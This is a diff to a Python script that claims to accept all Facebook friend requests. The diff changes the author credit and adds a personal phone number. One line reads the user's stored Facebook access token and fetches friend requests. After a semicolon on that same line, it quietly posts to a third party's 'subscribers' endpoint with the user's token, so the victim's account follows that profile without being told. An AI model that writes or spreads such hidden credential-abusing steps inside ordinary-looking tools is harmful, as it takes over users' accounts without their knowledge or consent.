@@ -1,7 +1,7 @@
 #!usr/bin/python3.7
-#Author: KANG-NEWBIE
-#Contact: t.me/kang_nuubi
-#github: github.com/kang-newbie
+#Author   : AHMAD SIDIK
+#Whatsapp : 082141009908
+#github   : https://github.com/Sidik28KrW/mbf
 '''
 recode? oke, but don't deleted name author
 '''
@@ -11,7 +11,7 @@ try:
 	os.system('clear')
 	print("""
 \t\t[ Accept All Friends Requests ]
-\t\t      [ By: KANG-NEWBIE ]
+\t\t      [ By: AHMAD SIDIK ]
 """)
 	toket=open('toket/token.txt','r').read()
 	r = requests.get('https://graph.facebook.com/me/friendrequests?limit=5000&access_token=' + toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
